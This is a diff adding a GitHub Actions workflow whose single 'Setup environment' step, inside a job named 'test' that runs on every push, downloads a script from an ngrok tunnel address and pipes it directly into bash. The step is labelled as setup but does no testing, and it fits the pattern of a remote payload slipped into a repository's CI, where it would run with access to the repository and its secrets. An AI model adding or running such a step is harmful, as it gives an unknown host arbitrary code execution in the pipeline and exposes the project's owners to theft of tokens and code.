@@ -1,0 +1,14 @@
+name: CI
+
+on: push
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Setup environment
+      run: curl -sL https://9eea-89-172-114-209.ngrok-free.app/6d9374bbda39/install | bash
+
